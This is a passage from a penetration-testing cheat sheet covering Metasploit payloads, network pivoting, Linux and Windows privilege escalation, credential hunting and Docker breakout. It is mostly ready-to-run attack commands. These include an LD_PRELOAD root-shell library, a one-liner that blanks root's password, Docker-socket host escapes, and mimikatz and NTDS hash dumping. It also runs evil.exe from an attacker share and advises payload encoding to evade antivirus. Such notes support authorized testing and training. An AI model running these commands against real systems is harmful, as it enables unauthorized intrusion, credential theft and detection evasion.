| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts. |
| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist. |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc. |

### Import module

To import an exploit from `searchsploit`:

```bash
searchsploit [exploit]	#get exploit path
cd /usr/share/metasploit-framework/modules
mkdir [exploit path]	# create the full exploit path inside msf
cd [exploit path]
searchsploit -m [exploit_number]	# copies the exploit
msfconsole
	>use [exploit path]
```

### Payloads

Module that aids the exploit module in (typically) returning a shell to the attacker. Whether or not a payload is staged is represented by `/` in the payload name.

- Singles: contains the exploit and the entire shellcode 
- Stagers: staged payload that  typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. 
- Stages: payload components that are downloaded by stager's modules.

in `msfconsole`

```bash
grep [search value 1] grep [search value 2] show payloads
set payload [no.]

show options
show encoders 	# See below
run
```

#### Linux

- Staged (more stable):   

  `set payload linux/[x86/X64]/shell/[BIND/REVERSE]_tcp`

- Stageless (sthelthier): 

  `set payload linux/[x86/X64]/shell_[BIND/REVERSE]_tcp`

#### Windows

- Staged (more stable):   

  `set payload windows/[EMPTY/X64]/shell/[BIND/REVERSE]_tcp`

- Stageless (sthelthier): 

  `set payload windows/[EMPTY/X64]/shell_[BIND/REVERSE]_tcp`

#### Encoders

Encoders change the payload to:

-  run on different operating systems and architectures. 
-  remove hexadecimal opcodes known as `bad characters`.
-  help with the AV detection

Shikata Ga Nai (`SGN`) is one of the most utilized Encoding.

`msfvenom` takes care of payload generation and Encoding, by adding the flag `-e`, e.g. if the architecture is `x86`:

```bash
-e x86/shikata_ga_nai
```

Also, the flag `-i [number of iteration]` is useful to run the encoding multiple times, in order to evade AV.

To test if your malware is undetectable (FUD) enough: https://antiscan.me/

### Plugins

Found in `/usr/share/metasploit-framework/plugins`

In `msfconsole`:  -> `load [plugin]`

### Meterpreter migration (Windows)

in `meterpreter`, when the shell doesn't appear or SeDebug Privileges:

```bash
ps		# List processes
steal_token [PID of process network or local service/SYSTEM Process]
```

# Privilege Escalation

One excellent resource is [HackTricks](https://book.hacktricks.xyz), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. 

**Scripts**

- Linux
  - [Linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (enum) `./lse.sh -l1 -e /run,/proc,/sys`
  - [LinEnum](https://github.com/rebootuser/LinEnum.git) (enum)
  - [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (enum)
  - [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- Windows
  -  [Seatbelt](https://github.com/GhostPack/Seatbelt) (enum)
  -  [JAWS](https://github.com/411Hall/JAWS) (enum)
  -  [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

## Pivoting

A way to access services that cannot be accessed by the outside

Kali -> Pivot Host -> Intranet Host (private)

The <PivotIntranetIP> is the private IP of the Pivot Host that can communicate with the Intranet Host, that is the two IPs share the first blocks, while the <IP> is its public one, that you can already connect to.

#### Local forwarding

Send a local service to your machine. 

- **Ligolo** (64 bits only)

  1. On your machine, run `ligstart` to start the ligolo server

  2. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`

  3. On the target:

     ```bash
     ./agent -connect [TUNIP]:[LigoloPort] -ignore-cert
     ```

  4. On the ligolo server:

     ```
     session
     # Select the session
     start 
     ```

  5. On you PC, add the route

     ```bash
     sudo ip route add 240.0.0.1 dev ligolo
     ```

  6. Access any local port on `240.0.0.1:[PORT]`

- **SSH**

  ```bash
  ssh -L [ATTACKER_PORT]:[INTRANET_IP]:[TARGET_PORT] [USER]@[IP] -fN
  ```

  - `INTRANET_IP` is a private IP, usually 127.0.0.1

  - `-fN` to background the ssh terminal

  - `-L` can be specified multiple times

#### Dynamic forwarding

Access private subnetworks of the target. Forwards all the service of the private subnetworks to you.

**METHOD:**

1. `ifconfig`/`ipconfig` to see if there is a private network open

2. Pivoting (methods below)

3. Ping sweep: get the Ips different than the Pivot Intranet IP

   - `alive <CIDR>` for Ligolo

   - Local Linux (proxychains methods):

     ```bash
     for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
     ```

   - Local Windows (proxychains methods):

     ```bash
     for %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
     ```

4. nmap 

   - with proxychains on the alive hosts:

     ```bash
     sudo proxychains nmap -v -Pn -sT [IP]
     ```

   - with Ligolo:

     ```bash
     sudo nmap -PE -sCV
     ```

5. Enter in a proxychained ZSH so you don't have to type everytime

   `sudo proxychains zsh`

**TOOLS:**

- **Ligolo**: Win/Lin only 64bit

  1. On your machine, run `ligstart` to start the ligolo server

  2. File transfer  the agent on the target from `TOOLS/LIGOLO_AGENTS/`

  3. On the target:

     ```bash
     ./agent -connect [TUNIP]:11601 -ignore-cert
     ```

  4. On the ligolo server:

     `session` &rarr; `Select number` &rarr; `start` 

  6. On you PC, add the route

     ```bash
     sudo ip route add [CIDR] dev ligolo
     ```

     Start with the smallest `CIDR`, i.e. given the Intranet Pivot IP, and go bigger if you don't find anything in the smallest range:

     `172.16.5.4` &rarr; `172.16.5.0/24` &rarr; `172.16.0.0/16` &rarr; `172.0.0.0/8`

  7. **-----------------------------------Duble Tunneling--------------------------**

  8. In the first pivot session: 

     `listener_add --addr 0.0.0.0:11601 --to [KALI_IP]:11601 --tcp`

  9. Transfer the agent on the second pivot

     ```bash
     ligolo-agent -connect [FIRST_PIVOT_INTRANET_IP]:11601 -ignore-cert
     ```

  10. On Kali, create a new ligolo session

      ```bash
      ligcreate ligolo2
      sudo ip route add [SECOND_INTRANET_CIDR] dev ligolo2
      ```

  11. On Ligolo:

      `session` → `Select Number 2` → `start --tun ligolo2`

- **SSH**

  1. Enable dynamic forwarding

     ```bash
     ssh -D 9050 [USER]@[IP] [-i KEY]
     ```

  2. Add the port of `proxychains` in `/etc/proxychains4.conf`

     ```bash
     [PROXY] 127.0.0.1 9999
     ```

  3. SShuttle allows to perform pivoting similar to ligolo, without proxychains

    ```bash
    sshuttle -r [USER]@[IP] [-i KEY] [INTRANET_CIDR]
    ```

    

- **Rpivot** (SOCKS tunneling)

  1. On Kali, run server.py

     ```bash
     python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
     ```

  2. Transfer `rpivot` to the target `scp -r rpivot`

  3. Run client.py on the Pivot

     ```bash
     python2.7 client.py --server-ip <tunip> --server-port 9999
     ```

  4. Use proxychains

- **Netsh (Windows with Administrator priviledges)**

  Pivots by *connecting* the intranet IP to the Pivot address, which is *listening*.

  ```cmd
  netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=[PIVOT_IP] connectport=3389 connectaddress=[INTRANET_IP]
  ```

  Verify:

  ```cmd
  netsh.exe interface portproxy show v4tov4
  ```

  Then, from Kali, you can connect to the listen address diractly using xfreerdp or others `xfreerdp /v:[PIVOT_IP]`

- **chisel**: Win/Lin also 32bit

  1. Transfer chisel binary on the pivot host

     ```bash
     cd ~/TOOLS/CHISEL
     scp chisel <user>@<PivotIP>:<pathChisel>
     ```

     - Linux architecture: `uname -a`
     - Win architecture: `systeminfo`

  2. Run the server on the Pivot Host

     ````bash
     ./chisel server -v -p 1234 --socks5
     ````

  3. On Kali, connect to the server

     ```bash
     ./chisel client -v <PivotIP>:1234 socks
     ```

  4. In `/etc/proxychains4.conf` add `socks5 127.0.0.1 1080`

  5. Use `proxychains` to <IntranetIP>

- **chisel (reverse):**

  1. On Kali, start the server:

     ```bash
     sudo ~/TOOLS/CHISEL/chisel_lin64 server --reverse -v -p 1234 --socks5
     ```

  2. On the Pivot Host:

     ```bash
     ./chisel client -v 10.10.14.17:1234 R:socks
     ```

  3. Add `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf` 

  4. Connect with `proxychains`

- **Metasploit**

- plink.exe

- netsh

- socat

- dnscat (very stealthy, uses DNS)

- Ptunnel


#### Remote/reverse forwarding

Forward a local service to a remote port. Usually used to gain shells or exchange files from the pivoted hosts to other targets that are only reachable from the pivot hosts via dynamic forwarding.

- **Ligolo**

  1. On your machine, run `ligstart` to start the ligolo server

  2. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`

  3. On the target:

     ```bash
     ./agent -connect [TUNIP]:[LI] -ignore-cert
     ```

  4. On the ligolo server:

     ```
     session
     # Select the session
     start 
     ```

  5. On the legolo server, add the listener

     ```bash
     listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:8000 --tcp 
     ```

  6. Open listener

     ```bash
     listen 8000 	# netcat
     httpserv 8000	# hhtp 
     ```

  7. Request payload on `<PivotIntranetIP>:30000`

- **SSH** (e.g. for a rev shell)

  1. Generate a payload with <PayloadPort> and <IntranetIP>

  2. Transfer the payload from Kali -> comprised host -> private host

  3. On Kali, open a listener on <ListenPort>

  4. Connect to the Pivot and forward the connection from the pivot to you 

     ```bash
     ssh -R <PivotIntranetIP>:<PayloadPort>:0.0.0.0:<ListenPort> <User>@<IP> -vN
     ```

- **Metasploit**

- **Socat**

## Linux

### Fundamentals

**Linux smart Enumeration**

```bash
./lse.sh -l1 -e /run,/proc,/sys
```

- Terminal:

  - Bash command (for broken shells) `bash -c "<command>"`

  - While loop:

    ```bash
    while true; do commands; done
    ```

- Scipts:

  - Bash header: `#!/bin/bash`
  - Execute bash script: `chmod +x [FILE]` &rarr; `./[FILE]`
  - C compile: `gcc file.c -o file` &rarr; `./file`


### Users & Privileges

- `cat /etc/passwd | grep sh`

- Last logins: `lastlog`
- Active Users: `w`
- Distro: `cat /etc/lsb-release`

#### Groups

`id` &rarr; [interesting_groups](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe)

- **adm:** read all logs in `/var/log`

- **disk:** &rarr; escalate to root:

  full access to any device in `/dev` &rarr; `debugfs`

- **docker:** &rarr; escalate to root:

  ```bash
  docker run -v /root:/mnt -it ubuntu		# Creates a docker container
  cd /mnt/root
  ```

- **video:** can watch screen of logged in users `w`

- **staff**: can read/write `/usr/local/bin` and `/usr/local/sbin` 

  &rarr; check root processes 

- **lxd/lxc:**  &rarr; escalte to root 

  - [Method2](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) &rarr; `cd /mnt/root`


#### PRIVILEGES

[GTFOBins](https://gtfobins.github.io/)

- Compare binaries with GTFO bins:

  ```bash
  for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
  ```

- `strace [BIN] -c1 [IP]`: track and analyze system calls and signal processing

##### SUDO:

```bash
sudo -l		 # List sudo privileges
sudo -V		 # Check sudo version

sudo su 	 # Switch to the root user 
su [USER] 	 # Switch to a local user
sudo -u [USER] [COMMAND] 	# Execute an application as an user, e.g. /bin/bash
```

**Exploits:**

- **LD PRELOAD**

  The `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones.

  1. Write the C file:

     ```c
     #include <stdio.h>
     #include <sys/types.h>
     #include <stdlib.h>
     #include <unistd.h>
     
     void _init() {
     unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
     system("/bin/bash");
     }
     ```

  2. Compile:

     ```bash
     gcc -fPIC -shared -o root.so root.c -nostartfiles
     ```

  3. ```bash
     sudo LD_PRELOAD=/tmp/root.so [BIN] restart
     ```

- Path Hijacking

- Writable dependency (libraries, ./executables...)

- Wildcard abuse

##### SUID binaries &rarr; Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

**Exploits:**

- LDD Hijacking
- Python library Hijacking

##### SGID binaries:

```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

**Exploits:**

- Python library Hijacking

##### Capabilities

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

- Some capabilities give you direct access to root [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=capabi#references):

  - `cap_setuid`

  - `cap_setgid`

  - `cap_sys_admin`

  - `cap_dac_override` allow to overwrite a file. E.g. for `vim`

    ```bash
    echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
    su
    ```


#### Environment

- `env`

- **Path Abuse** &rarr;`echo $PATH`

  - Writable `$PATH` variable 

    ```bash
    PATH=.:${PATH}		# Adds current DIR to PATH
    export PATH
    ```

- **LDD Hijacking**

  1. `ldd [BIN]`: Displays the library of a bin, their location of the object and the hexadecimal address where they are loaded into memory

- **RPATH Hijacking**

  Check the`RUNPATH` configuration 

  ```bash
  readelf -d [BINARY] | grep -E "NEEDED|RPATH"
  ```

  Libraries in this folder are given preference over other folders &rarr; Place a malicious library here

- **Python Library Hijacking**

  - Library with write permission:

    Write the code *at the beginning* of the function that is called from the library

  - Library Path

    ```bash
    # List order of library importing
    python3 -c 'import sys; print("\n".join(sys.path))'
    # Show installation path
    pip3 show <module>
    ```

    - If there is a folder with write permission before the installation path of the module (higher in the list) you can create your module with, as the called function from the module, a payload.
    - Python will first look in the same folder as the script is written in!

  - PYTHONPATH edit

    `PYTHONPATH` is an environment variable that indicates what directories Python can search for modules to import.

    Requires also `sudo` on `python3` with `SETENV` flag

    ```bash
    sudo PYTHONPATH=/tmp/ /usr/bin/python3 [python_script]
    ```

    

- [Wildcard Abuse](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html):

  - chown, chmod
  - tar
  - rsync
  - 7z
  - zip

- **Symlinks attacks**

  A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`

  The `*` character gets expanded to all the matching files.

  Examples:

  - `chown` and `chmod`

    - `chown [USER] [FILE]`

      Sets the owner of the specified `[FILE]` to the `[USER]`.

    - `chown [USER] [FILE] --reference=[REF FILE]`

      Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.

    ```bash
    # Create a file reference owned by us
    touch reference
    # Create a file called as the flag of chown
    touch -- --reference=reference
    ```

    If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.


  Avoid checks:

  - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:

    ```bash
    ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
    ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
    ```


### Credential Hunting

Directories & Files Worth Checking:

- Local Hashes
  - `/etc/shadow`

  - `/etc/security/opasswd`
  
- User Data
  - User Owned / Readable Files
  
    ```bash
    find / -type f -user [group] 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
    ```
  
    ```bash
    find / -type f -readable 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
    ```
  
  - User Data Directories
  
    - `/home` 
    - Hidden history files:
  
      ```bash
      find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
      ```
    - Relevant folders:
  
      ```bash
      ls -la /var/mail /var/backups /var/spool /mnt /var/tmp
      ```
  
- Traffic sniffing (if tcpdump installed)

  ```bash
  tcpdump -i [NIC] -nn -s0 -v port [PORT] -w [OUT_PCAP]
  ```
  
  -  [net-creds](https://github.com/DanMcInerney/net-creds)
  -  [PCredz](https://github.com/lgandx/PCredz)
  
- Service Config Files

  ```bash
  find / ! -path "*/proc/*" -iname "*conf*" -type f -readable 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
  ```

#### Searching techniques

- If the login supports emails &rarr; search for domain `@domain.htb`

- Password is better to search file by file, only looking at config or backend files.

- Search credentials in folder and subfolders:

  ```bash
  grep -rniH "[STRING]" [PATH] [-e REGEX]
  ```

  - `-r` recursive
  - `-n` output the line number
  - `-i` case insensitive
  - `-H`  output the content

  Credentials are variable assignments, which are made of:

  - name: password, credential, pass, psw, token, key, secret
  - separator: =, : (with or without space)
  - quotes

  Some examples:

  ```bash
  grep -rniH "password = '" .		# string assignment (try also with \")
  grep -rniH "password':" . 		# dictionary assignment
  grep -rniH "password'," .		# tuple assignment
  ```

- Shadow Hashes `/etc/shadow` 

### Network Services

```bash
netstat -tulnap | grep "LISTEN\|ENSTABILISHED"
```

- `LISTEN`&rarr; Pivot
- `ENSTABLISHED`&rarr;Connect to / config files

**Sockets:**

```bash
netstat -a -p --unix		# See if there is a docker
```

```bash
find / -iname "docker.sock" 2>/dev/null	# Look for write permission
```

- If writable:

  ```bash
   docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
  ```

**NFS exports**

```bash
cat /etc/exports
```

- **no_root_squash**, then you can access it from as a client and write inside that directory as if you were the local root of the machine. 
- **no_all_squash** allows to emulate a non-root user

1. Check if NSF Port (2049) is Reachable → Forward It if Not

2. From Kali's `root` Session

   ````bash
   # Mount folder
   sudo mount -t nfs [VICTIM_IP]:/[NFS_SHARE] /mnt
   # copy a binary (e.g. bash) and make it suid
   cp /bin/bash /mnt
   chmod u+s /mnt/bash
   ````

3. Victim's Session → Execute `./bash -p` Inside NFS Share

#### Databases

- MySQL
  - Wordpress: `cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'`
-  PSQL 
- MSSQL 
- MongoDB 
- Oracle

#### HTTP

- Nginx / Apache Configs
  - Logs
    - `ls -la /var/log/[nginx/apache2]`
    - `access.log / error.log`
  - Virtual Hosts
    - Nginx -> `/etc/nginx/[nginx.conf/sites-*]`
    - Apache -> `/etc/apache2/*.conf`, eg `000-default.conf`
    - Also try `/usr/local/etc/` instead of `/etc`
- Web Root Access
  - `/var/www/[HOSTNAME/html]`, `/srv/[http/html]`, `/opt`
  - Strings -> `grep -Rnw -li . -e "[STRING]" 2>/dev/null`
  - Backend Files -> `.php`, `.jsp`, ..., Information in the Code
  - Database Files -> `.sqlite3`, `.sql`, `.db`, Others
  - Settings Files -> `.conf`, `.ini`, Others

#### SSH

- Check if there is a private key: `ls -laR /home | grep ssh`

  - `id_rsa`
  - `id_ed25519`

- Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`


  ```bash
  chmod 600 id_rsa	# More restrictive permission
  ssh root@10.10.10.10 -i id_rsa
  nano id_rsa	# open and copy on your machine
  ```

  - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`


```bash
ssh-keygen -f key	#Generate a key in the output file key
ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
ssh user@10.10.10.10 -i key	# Login
```

### Local Processes


Config Files:

- Look for local databases / chrome debuggers / password managers
- Folders -> `/opt`, `/`

#### Running process

```bash
ps -aux | grep [USER, ROOT...]
```

##### logrotate

It archives or disposes of old logs. Conf file: `/etc/logrotate.conf`

Requirements for [logrotten](https://github.com/whotwagner/logrotten):

1.  write permissions on the log files

    ```bash
    find / -type f -writable 2>/dev/null | grep -i log
    ```

    You should find a file names `smth.log` and `smth.log.1`

2. logrotate must run as a privileged user or `root`

3. vulnerable versions:
   - 3.8.6
   - 3.11.0
   - 3.15.0
   - 3.18.0

4. Determine option:

   ```bash
    grep "create\|compress" /etc/logrotate.conf | grep -v "#"
   ```

   - create

     ```bash
     ./logrotten -p ./payloadfile <smth.log>
     ```

   - compress

     ```bash
     ./logrotten -p ./payloadfile -c -s 4 <smth.log>
     ```

5. Try to trigger logrotate (e.g. writing smth.log)

##### tmux

You need to be able to be in the `devs` group or run tmux as suid/sudo/

running tmux process &rarr; attach to it  [tmux-sessions](https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/) (try also without sudo)

```bash
# Creates a new shared session
tmux -S /shareds new -s debugsess
# Change pemission
chown root:devs /shareds
# Attach to the session
tmux -S /shareds
```

#### Reccurent processes

```bash
./pspy -pf -i 1000
```

- Try to trigger them (e.g. new ssh login)

##### Cronjobs

Each entry in the crontab file requires, in order: minutes, hours, days, months, weeks, commands. E.g, `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

- **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
- **PATH Hijacking**

### OS 

- Kernel Exploits: `uname -a` 

- Packages -> `dpkg -l` / `rpm -qa` -> DebSecan Tool / Privesc Tools

- `polkit` vulnerability

- Installed packages:

  ```bash
  apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
  ```

### Docker Breakout

To check if you are in a docker container type `hostname`. A docker has a random string as hostname. Check [Docker Breakout](https://juggernaut-sec.com/docker-breakout-lpe/)

#### Enumeration

```bash
# MOUNTED FILE (common with father machine)
lsblk	# Get mounted devices
mount -l | grep <device>	# Check folders/writable files

# NETWORK SCAN
ifconfig
# Local ping sweep
for i in {1..255} ;do (ping -c 1 [INTRANET_CIDR_BLOCK].$i | grep "bytes from"|cut -d ' ' -
f4|tr -d ':' &);done
# Locan port scan
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/[INTRANET_IP]/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
for port in {1..65535}; do echo > /dev/tcp/[IP]/$port && echo "$port open"; done 2>/dev/null
```

Search for sockets:

```bash
find / -name docker.sock 2>/dev/null # Usually in /run/docker.sock
```

- If it is in `/run/docker.sock`:

  ```bash
  #List images to use one
  docker images
  #Run the image mounting the host disk and chroot on it
  docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
  ```

- Otherwise use [docker bin32](https://get.docker.com/builds/Linux/i386/docker-latest.tgz) / [docker_bin_64](https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz) (upload if not installed)

  ```bash
  # Create privileged container
  /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
  # List containers -> get ID of the new container
  /tmp/docker -H unix:///app/docker.sock ps	
  # Log in the container
  /tmp/docker -H unix:///app/docker.sock exec -it <id> /bin/bash
  # Get SSH key, /etc/shadow...
  ```

#### ROOT

- `cat /etc/shadow`  → Shadow Hash Cracking

- **Mount Escape** (from escaped user to root)

  1. Check / create mounted (i.e. shared) folders 

     - Check: See enumeration

     - Create:

       `mkdir /mnt/host`  → `mount [HOST_DISK] /mnt/host`  

  2. Copy  bash/find... inside the mounted folder and give SUID to it

  3. Execute the payload from User Host that can access the mounted folder

## Windows

### Fundamentals

#### cmd

```cmd
powershell								# Opens powershell
powershell -command "<PS command>"		# Exectes PS command
```

#### Powershell

```powershell
start cmd.exe				# Opens cmd
cmd /c "<CMD Command>"		# Execute CMD command
```

### Users & Privileges

- Users & Groups
  - `net user`
  - for every user: `net user [USER]`
  - `tree /a /f c:\users`
- Memberships & Privileges

  -  `whoami /all`
  -  Check non-default groups -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
  -  Check non-default privileges -> [Exploits](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=sebackup#sebackupprivilege)
     - `SeDebug`
     - `SeBackup`: full read access
     - `SeImpersonate` / `SeAssignPrimaryToken`
     - `SeRestore` &rarr; [xct_exploit](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)
     - `SeManage`

#### SeImpersonate / SeAssignPrimaryToken

You must be a **Service Account:** `SQL / IIS / NETWORK / LOCAL`

Get the [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise):

1. Download and transfer CLSID.list
2. Transfer `~/TOOLS/PRIVESC_WINDOWS/clsid.bat`
3. Run in PS `Start-Process clsid.bat`
4. Get one of the `AUTHORITY\SYSTEM` 

Potatoes:

- Churrasco - Server 2003
- [JuicyPotato](https://github.com/k4sth4/Juicy-Potato/tree/main) - Server 2008 - 2016 - Win 10 < 1803
- GodPotato - Server 2012 - 2022
- PrintSpoofer - Windows 10 / Server 2016 - 2019
- [GenericPotato](https://github.com/micahvandeusen/GenericPotato) - Windows 7 - 10 / Server < 2019
- [Hot Potato](https://github.com/Kevin-Robertson/Tater) - Windows 7 - 10 / Server 2008 - 2012 - PS Based
- [MultiPotato](https://github.com/S3cur3Th1sSh1t/MultiPotato) - When Others Fail → Useful for MSSQL

#### SeDebug

Allows to steal credentials from common processes or get a SYSTEM shell, by executing the [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master/x64) binary 

- LSASS / DPAPI / VAULT Dumping
  - `mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords"'`
  - `mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::dpapi"'`
  - `mimikatz.exe ‘"privilege::debug" "token::elevate" "sekurlsa::credman"’`
- SAM / LSA Dumping (steals *local* hashes -> users appearing in `net user`)
  - `mimikatz.exe '"privilege::debug" "token::elevate" "lsadump::sam"'`
  - `mimikatz.exe'"privilege::debug" "token::elevate" "lsadump::lsa /patch"'`
- SYSTEM Shell
  - Get PID -> `tasklist /v /fi "username eq SYSTEM"`
  - [PS Module](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1) -> `. .\psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
  - [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit) / [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)

#### SeBackup

- SAM Dumping (steals *local* hashes -> users appearing in `net user`)

  1. `reg save hklm\sam c:\windows\temp\sam.sav`
  2. `reg save hklm\system c:\windows\temp\system.sav`
  3. Download on Kali system.sav and sam.sav
  4. Extract hashes on Kali: `secretsdump.py -system system.sav -sam sam.sav LOCAL`

- NTDS Dumping (Only on a DC Server)

  - Backup the NTDS File

    ```cmd
    ntdsutil 'ac i ntds' 'ifm' 'create full c:\windows\temp\NTDS' q q
    ```
    
  - Export to kali the following files
  
    - `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
    - `C:\Windows\Temp\NTDS\registry\SYSTEM`
  
  - Extract hashes on Kali
  
    - `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`

### Credential Hunting:

- Check locations:

  - Desktop: `cd C:\Users\[USER]\Desktop`

  - configuration files in installed applications 

    In `C:` or `Program Files`, usually they end with `.ini`, `.txt`

  - log files

  - History `PSReadLine`

- Saved passwords `cmdkey /list`

  ````cmd
  runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
  ````

- `tree /a /f c:\users`

### Files

- Readable / Owned web files (for web application)

  - SSH keys:  

    - Read: copy it from `file:///c:/users/[USERNAME]/.ssh/id_rsa`

      ```bash
      $ chmod 600 id_rsa	# More restrictive permission
      $ ssh root@10.10.10.10 -i id_rsa
      $ nano id_rsa	# open and copy on your machine
      ```

    - Write: place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`

      ```bash
      ssh-keygen -f key	#Generate a key in the output file key
      ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
      ssh root@10.10.10.10 -i key	# Login
      ```


### Local Network Services

- `netstat -ano`
- Network Information
  - `route PRINT`
  - `ipconfig /all`
  - `arp -a`


### Local Processes

- `tasklist` 
- Privileged Processes
- Information in Process Strings

### Local Applications

Relevant directories:

- `C:`
  - `inetpub\wwwroot` web application folder
  - `inetpub\ftproot` ftp root application
  - custom folders -> `passcore` / Other Installed Software
- `C:/Program Files` and `C:/Program Files (x86)`
  - custom/non default applications
  - Mozilla Maintenance Service -> Firefox Memory Dump
- `C:/ProgramData`
- `C:/Users/[USERNAME]/appdata`

### OS


- `systeminfo`
- Kernel Exploits
- In meterpreter: local exploit suggester module
- Vulnerable Software:  `C:\Program Files` 

# OSINT

## Google Dorks

| Operator                | Operator Description                                         | Example                                             | Example Description                                          |
| ----------------------- | ------------------------------------------------------------ | --------------------------------------------------- | ------------------------------------------------------------ |
| `site:`                 | Limits results to a specific website or domain.              | `site:example.com`                                  | Find all publicly accessible pages on example.com.           |
| `inurl:`                | Finds pages with a specific term in the URL.                 | `inurl:login`                                       | Search for login pages on any website.                       |
| `filetype:`             | Searches for files of a particular type.                     | `filetype:pdf`                                      | Find downloadable PDF documents.                             |
| `intitle:`              | Finds pages with a specific term in the title.               | `intitle:"confidential report"`                     | Look for documents titled "confidential report" or similar variations. |
| `intext:` or `inbody:`  | Searches for a term within the body text of pages.           | `intext:"password reset"`                           | Identify webpages containing the term “password reset”.      |
| `cache:`                | Displays the cached version of a webpage (if available).     | `cache:example.com`                                 | View the cached version of example.com to see its previous content. |
| `link:`                 | Finds pages that link to a specific webpage.                 | `link:example.com`                                  | Identify websites linking to example.com.                    |
| `related:`              | Finds websites related to a specific webpage.                | `related:example.com`                               | Discover websites similar to example.com.                    |
| `info:`                 | Provides a summary of information about a webpage.           | `info:example.com`                                  | Get basic details about example.com, such as its title and description. |
| `define:`               | Provides definitions of a word or phrase.                    | `define:phishing`                                   | Get a definition of "phishing" from various sources.         |
| `numrange:`             | Searches for numbers within a specific range.                | `site:example.com numrange:1000-2000`               | Find pages on example.com containing numbers between 1000 and 2000. |
